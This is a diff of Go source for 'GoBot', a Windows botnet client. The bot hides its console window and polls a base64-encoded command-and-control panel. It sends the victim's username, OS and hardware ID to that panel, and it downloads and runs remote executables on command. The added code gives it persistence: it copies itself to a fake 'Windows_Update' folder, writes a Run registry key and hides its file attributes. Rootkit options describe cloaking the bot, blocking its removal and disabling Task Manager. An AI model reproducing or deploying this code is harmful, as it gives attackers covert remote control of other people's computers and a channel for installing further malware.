@@ -1,55 +1,52 @@
 //Compile with   go build -o GoBot.exe -ldflags "-H windowsgui" "C:\gobot.go"    to have no console show.
 // By SaturnsVoid
 
-//https://github.com/luisiturrios/gowin
-//code.google.com/p/winsvc/winapi
-//https://www.socketloop.com/tutorials/
-//https://mmcgrana.github.io/2012/09/go-by-example-timers-and-tickers.html
-
-//persistance?
-// hydra (multiplit and add to registry at new location, more then one will start but SingleInstance will make sure that only one runs at a time)
-// Hidden VBS script to run in the BG (make sure the files still in registry? Bot and VBS make sure each other are running?
-// Multi-Channel?
-
-//Anti-Botnet
-// Scans Statup Registry and remove potential threats? (how to detect threats?)
-
 package main
 
 import (
 	"bytes"
     "fmt"
-	"os/user"
     "io/ioutil"
+	"io"
+	"math/rand"
     "net/http"
 	"syscall"
     "unsafe"
-	"io"
-	"encoding/base64"
-	"os"
+	"strings"
+	"time"
+	"net/url"
+	"os/user"
 	"github.com/luisiturrios/gowin"
 	"crypto/md5"
     "encoding/hex"
-	"strings"
+	"encoding/base64"
+	"os"
 	"os/exec"
-	"time"
+
+	"GoBot/rootkit"
 )
 
 var(
-
+//================================================================================
+//================================================================================
+//================================================================================
 //==========================================================Edit
-Panel string = "aHR0cDovLzEyNy4wLjAuMS9jbWQucGhw" //Control Panel URL(Base64 Encoded) http://127.0.0.1/cmd.php = aHR0cDovLzEyNy4wLjAuMS9jbWQucGhw
-//ReconnectTime int = 5 //Minutes
+Panel string = "aHR0cDovLzEyNy4wLjAuMS9nb2JvdC9Hb0JvdC5waHA=" //Control Panel URL(Base64 Encoded) http://127.0.0.1/cmd.php = aHR0cDovLzEyNy4wLjAuMS9jbWQucGhw
+ReconnectTime time.Duration = 5 //Minutes
 SingleInstance bool = true //True = Only one can run, False = Mutliple can run at once
 InstanceKey string = "0f7b0fcd-d67c-43d8-b7e5-76f95da01665" //Key to detect for Single Instance http://www.guidgen.com/
-Install bool = false // True = Install, False = No Install
-InstallName string = "Microsoft Batch Installer"
-InstallPath string = os.Getenv("APPDATA") + "\\windows.exe" //Where the bot will install C:\Users\SaturnsVoid\AppData\Roaming
-InstallHKEY string = "%APPDATA%" + "\\windows.exe" //Registry Key for where the bot will install 
+USE_Install bool = false // If enabled, GoBot will add itelf to startup
+USE_Stealth bool = false // If enabled, GoBot will add hidden and system attributes to its files
+USE_Rootkit bool = false /* If enabled, this will:
+										- Actively cloak GoBot's files from user detection
+										- Actively monitor registry to prevent removal from start up
+										- Disable task manager and other system tools
+										- Protect GoBot's process from termination */
 
 //==========================================================End Edit
-
-//MyFile string
+//================================================================================
+//================================================================================
+//================================================================================
 LastCMD string
 
 modkernel32 = syscall.NewLazyDLL("kernel32.dll")
@@ -57,6 +54,7 @@ procCreateMailslot = modkernel32.NewProc("CreateMailslotW")
 
 kernel32, _        = syscall.LoadLibrary("kernel32.dll")
 getModuleHandle, _ = syscall.GetProcAddress(kernel32, "GetModuleHandleW")
+
 user32, _     = syscall.LoadLibrary("user32.dll")
 messageBox, _ = syscall.GetProcAddress(user32, "MessageBoxW")
 )
@@ -78,126 +76,198 @@ const (
     MB_ICONERROR         = MB_ICONHAND
     MB_ICONINFORMATION   = MB_ICONASTERISK
     MB_ICONSTOP          = MB_ICONHAND
+
     MB_DEFBUTTON1 = 0x00000000
     MB_DEFBUTTON2 = 0x00000100
     MB_DEFBUTTON3 = 0x00000200
     MB_DEFBUTTON4 = 0x00000300
+	
+	letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 )
 
-//-------------------------Main Function---------------------------------------------
-
 func main() {
-	//args := os.Args
-	//if len(args) > 1{
-	//	fmt.Println("Test")
-	//}
-	//Check for args, handle args.
-	//MyFile := os.Args[0]
-
+	defer syscall.FreeLibrary(kernel32)
+    defer syscall.FreeLibrary(user32)
 	
 	if SingleInstance != false{
 	  err := singleInstance(InstanceKey)
 		if err != nil {
-			//os.Exit(0)
 		}
 	}
-	if Install != false{
-		meInstall()
+	DebugLog("Started New Instance...")
+	DebugLog("Generating HWID: " + getUID())
+	if USE_Install {
+		DebugLog("Installing GoBot...")
+		Install()
 	}
-	  //check internet bofore? on loop?
+
+	if USE_Stealth && USE_Install {
+		DebugLog("Stealth Installing GoBot...")
+		rootkit.Stealthify()
+	}
+
+	if USE_Rootkit && USE_Stealth && USE_Install {
+		DebugLog("Installing GoBot and Activating Rootkit...")
+		go rootkit.Install()
+	}
+
+	//DebugLog("Sleeping for 1 minute...")
+	//time.Sleep(60 * time.Second)
+	httpPOSTInformation()
 	
 	for {
-		time.Sleep(5 * time.Second) //5 Second timer, Will fix next patch
-		fmt.Println("Tick")
+		time.Sleep(ReconnectTime * time.Second)
 		httpGETCommands()
-	}
-	
+	}	
 }
 
-//------------------------------HTTP Worker---------------------------------------- 
-//http://golang.org/pkg/net/http/
-
-//cmd, err := httpWorker("intro&data=")
-//	if err != nil {
-//		panic(err)
-//	}
-//	fmt.Println("Latest Command:", cmd)
-//}
-//  intro&data=
-
-//Panel adds UID to database if it does not exist
-
 func httpGETCommands(){
-	if checkInternet(){ // Check for panel connection	
-		rsp, err := http.Get(base64Decode(Panel)+ "?get=" + getUID())
-    	if err != nil {
-        	//return ""
-    	}
-    	defer rsp.Body.Close()
-    	buf, err := ioutil.ReadAll(rsp.Body)
-    	if err != nil {
-        	//return ""
-    	}	
-		data := base64Decode(string(bytes.TrimSpace(buf)))	
-		if data != LastCMD{
-			tmp := strings.Split(data, "|")
-			if tmp[0] == "ALL" || tmp[0] == getUID(){		 //ALL or just me
-				if tmp[1] == "0"{ //DIE
-					os.Exit(0)				
-				}else if tmp[1] == "1"{ //cmdHandler("ALL|1|http://www.google.com|V")
-					if tmp[3] == "V"{ //Visable
-						if strings.Contains(tmp[2], "http://"){
-							exec.Command("cmd", "/c", "start", tmp[2]).Start()
-							LastCMD = data					
-						}
-					}else if tmp[3] == "H"{//Hidden
-						if strings.Contains(tmp[2], "http://"){
-							rsp, err := http.Get(tmp[2])
-								if err != nil {						
+	rsp, err := http.Get(base64Decode(Panel)+ "?get=" + getUID())
+    if err != nil {
+	DebugLog("Bad connection to panel...")
+    }else{
+		defer rsp.Body.Close()
+		buf, err := ioutil.ReadAll(rsp.Body)
+		if err != nil {
+		}else{
+			var tmpdat string = string(bytes.TrimSpace(buf))
+			if tmpdat == "Bot does not exist."{
+				httpPOSTInformation()
+			}else{
+				DebugLog("Encoded Command Found: " + string(bytes.TrimSpace(buf)))
+				data := base64Decode(tmpdat)
+				if data != LastCMD{
+					tmp := strings.Split(data, "|")
+					if tmp[0] == "ALL" || tmp[0] == getUID(){
+						DebugLog("Decoded Command for me: " + data)
+						if tmp[1] == "0"{
+							os.Exit(0)				
+						}else if tmp[1] == "1"{
+							if tmp[3] == "V"{
+									if strings.Contains(tmp[2], "www."){
+										DebugLog("Opening Website V: " + tmp[2])
+										LastCMD = data	
+										exec.Command("cmd", "/c", "start", tmp[2]).Start()				
+									}
+							}else if tmp[3] == "H"{
+									if strings.Contains(tmp[2], "www."){
+										DebugLog("Opening Website H: " + tmp[2])
+										LastCMD = data	
+										rsp, err := http.Get(tmp[2])
+										if err != nil {						
+										}
+										defer rsp.Body.Close()						
+									}
 								}
-								defer rsp.Body.Close()
-								LastCMD = data							
+						}else if tmp[1] == "2"{
+							DebugLog("Showing MessageBox: " + tmp[2])
+							LastCMD = data	
+							MessageBox(tmp[2], tmp[3], MB_OK)	
+						}else if tmp[1] == "3"{
+							if strings.Contains(tmp[2], ".exe"){
+								DebugLog("Attempting to start: " + tmp[2])
+								LastCMD = data	
+								run("start " + tmp[2])
+							}
+						}else if tmp[1] == "4"{
+							if strings.Contains(tmp[2], ".exe") && strings.Contains(tmp[2], "http://"){
+								DebugLog("Attempting to download and run: " + tmp[2])
+								LastCMD = data	
+								DownloadAndRun(tmp[2])
+							}
 						}
-					}
-				}else if tmp[1] == "2"{ //Show message box //cmdHandler("ALL|2|Title|Message")
-					MessageBox(tmp[2], tmp[3], MB_OK)
-					LastCMD = data				
-				}else if tmp[1] == "3"{
-								
-				}else if tmp[1] == "4"{
-				
-				}
-			}		
+					}		
+				}	
+			}
 		}	
 	}
 }
-//-------------------------Check Internet--------------------------------------------
-func checkInternet() (bool) { //Connect to cmd.php and see if it replys with just "ok" to check connection
-    rsp, err := http.Get(base64Decode(Panel)+ "?test")
-    if err != nil {
-        return false//bad connection
-    }
-    defer rsp.Body.Close()
-    buf, err := ioutil.ReadAll(rsp.Body)
-    if err != nil {
-        return false//bad connection
-    }
-	if string(bytes.TrimSpace(buf))!= "ok"{
-		return false //bad connection
-	}else{
-		return true //connection ok
-	}   
+
+func httpPOSTInformation(){
+		DebugLog("Sending Host Information...")
+		data := url.Values{}
+		data.Set("INFO", "")
+		data.Add("HWID", getUID())
+		data.Add("USERNAME", getUsername())
+		data.Add("WINDOWS", getOS())
+		u, _ := url.ParseRequestURI(base64Decode(Panel))
+		urlStr := fmt.Sprintf("%v", u)
+		client := &http.Client{}
+		r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode())) // <-- URL-encoded payload
+		r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+		resp, err := client.Do(r)
+		if err != nil {
+		DebugLog("Bad connection to panel...")
+		}else{
+			DebugLog("Panel: " + resp.Status)
+		}
 }
-//-------------------------------MessageBox----------------------------------- 
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//-----------------------------------------------------------------Single Instance
+func singleInstance(name string) error {
+    ret, _, _ := procCreateMailslot.Call(
+        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`\\.\mailslot\`+name))),
+        0,
+        0,
+        0,
+    )
+    if int64(ret) == -1 {
+        os.Exit(0)
+    }
+    return nil
+}
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//-----------------------------------------------------------------Information
+func getUsername() string{
+	usr, _:= user.Current()
+	return usr.Username
+}
 
-//	https://github.com/golang/go/wiki/WindowsDLLs
+func getOS()string{
+	val, _:= gowin.GetReg("HKLM", `Software\Microsoft\Windows NT\CurrentVersion`, "ProductName")
+    return val
+}
 
-//	defer syscall.FreeLibrary(kernel32)//For MessageBox
-//	defer syscall.FreeLibrary(user32)//For MessageBox
+func getWInstalDate()string{
+	val, _:= gowin.GetReg("HKLM", `Software\Microsoft\Windows NT\CurrentVersion`, "InstallDate")
+    return val
+}
 
-//	MessageBox("Title", "Message", MB_OK) //Just shows messagebox
-//	fmt.Printf("Return: %v\n", MessageBox("Title", "Message", MB_YESNO)) // Returns the answer (6 = Yes, 7 = No)
+func getUID() string{
+	return getMD5Hash("GoBot$" + getUsername() + getOS() + getWInstalDate()+ "$toBoG")
+}
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//----------------------------------------------------------------Cryptography
+func getMD5Hash(text string) string {
+    hasher := md5.New()
+    hasher.Write([]byte(text))
+    return hex.EncodeToString(hasher.Sum(nil))
+}
+func base64Encode(str string) string {
+    return base64.StdEncoding.EncodeToString([]byte(str))
+}
 
+func base64Decode(str string) string {
+    data, err := base64.StdEncoding.DecodeString(str)
+    if err != nil {
+        return ""
+    }
+    return string(data)
+}
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//-----------------------------------------------------------------MessageBox
 func abort(funcname string, err error) {
     panic(fmt.Sprintf("%s failed: %v", funcname, err))
 }
@@ -231,97 +301,76 @@ func GetModuleHandle() (handle uintptr) {
     }
     return
 }
-//------------------Single Instance------------------------------------
-
-func singleInstance(name string) error {
-    ret, _, _ := procCreateMailslot.Call(
-        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`\\.\mailslot\`+name))),
-        0,
-        0,
-        0,
-    )
-    // If the function fails, the return value is INVALID_HANDLE_VALUE.
-    if int64(ret) == -1 {
-        os.Exit(0)
-    }
-    return nil
-}
-//------------------Information Get------------------------------------
-	
-func getUsername() string{
-	usr, _:= user.Current()
-	return usr.Username
-}
-
-func getOS()string{
-	val, _:= gowin.GetReg("HKLM", `Software\Microsoft\Windows NT\CurrentVersion`, "ProductName")
-    return val
-}
-
-func getWInstalDate()string{
-	val, _:= gowin.GetReg("HKLM", `Software\Microsoft\Windows NT\CurrentVersion`, "InstallDate")
-    return val
-}
-
-func getUID() string{ //Make more Uniqe for computer...
-	return getMD5Hash("GoBot$" + getUsername() + getOS() + getWInstalDate()+ "$toBoG")
-}
-//------------------Install & Uninstall-----------------------
-	
-func meInstall(){
-	MyFile := os.Args[0]
-	err := CopyFile(MyFile, InstallPath)
-	if err != nil {
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//--------------------------------------------------------------Installer
+func Install() {
+	if !(strings.Contains(os.Args[0], "winupdt.exe")) {
+		run("mkdir %APPDATA%\\Windows_Update")
+		run("copy " + os.Args[0] + " %APPDATA%\\Windows_Update\\winupdt.exe")
+		run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe")
+		run("attrib +H +S " + os.Args[0])
 	}
-	err = gowin.WriteStringReg("HKCU",`Software\Microsoft\Windows\CurrentVersion\Run`,InstallName,InstallHKEY)
-    if err != nil {
-    }	
-} 
+}
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//----------------------------------------------------------------Debug Logger
+func DebugLog(text string){
+	currenttime := time.Now().Local()
+    fmt.Println("[", currenttime.Format("2006-01-02 15:04:05"), "] " + text)
+}
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//----------------------------------------------------------------------------CMD Runner
+func run(cmd string) {
+	c := exec.Command("cmd", "/C", cmd)
 
-func meUninstall(){
-	err := gowin.DeleteKey("HKCU",`Software\Microsoft\Windows\CurrentVersion\Run`,InstallName)
-    if err != nil {
+    if err := c.Run(); err != nil { 
+        //fmt.Println("Error: ", err)
+    }   
+}
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//--------------------------------------------------------------------------Download and Run File
+func DownloadAndRun(url string) {
+	fileName := RandStringBytes(5) + ".exe"
+	DebugLog("Downloading " + url + " to " + fileName)
+	output, err := os.Create(os.Getenv("APPDATA") + "\\" + fileName)
+	if err != nil {
+		return
+	}
+	defer output.Close()
+	response, err := http.Get(url)
+	if err != nil {
+		return
+	}
+	defer response.Body.Close()
+	n, err := io.Copy(output, response.Body)
+	if err != nil {
+		return
+	}
+	DebugLog(string(n) + " file downloaded.")
+	DebugLog(os.Getenv("APPDATA") + "\\" + fileName)
+	DebugLog("Attempting to start " + fileName)
+	exec.Command("cmd", "/c", "start", os.Getenv("APPDATA") + "\\" + fileName).Start()		
+}
+//================================================================================
+//================================================================================
+//================================================================================
+//================================================================================
+//-------------------------------------------------------------------------Random String Generator
+func RandStringBytes(n int) string {
+    b := make([]byte, n)
+    for i := range b {
+        b[i] = letterBytes[rand.Intn(len(letterBytes))]
     }
-} 
-
-//------------------Crypto------------------------------------
-
-func base64Encode(str string) string {
-    return base64.StdEncoding.EncodeToString([]byte(str))
+    return string(b)
 }
-
-func base64Decode(str string) string {
-    data, err := base64.StdEncoding.DecodeString(str)
-    if err != nil {
-        return ""
-    }
-    return string(data)
-}
-
-func getMD5Hash(text string) string {
-    hasher := md5.New()
-    hasher.Write([]byte(text))
-    return hex.EncodeToString(hasher.Sum(nil))
-}
-
-//--------------------File Worker-------------------------
- func CopyFile(source string, dest string) (err error) {
-     sourcefile, err := os.Open(source)
-     if err != nil {
-         return err
-     }
-     defer sourcefile.Close()
-     destfile, err := os.Create(dest)
-     if err != nil {
-         return err
-     }
-     defer destfile.Close()
-     _, err = io.Copy(destfile, sourcefile)
-     if err == nil {
-         sourceinfo, err := os.Stat(source)
-         if err != nil {
-             err = os.Chmod(dest, sourceinfo.Mode())
-         }
-     }
-     return
- }
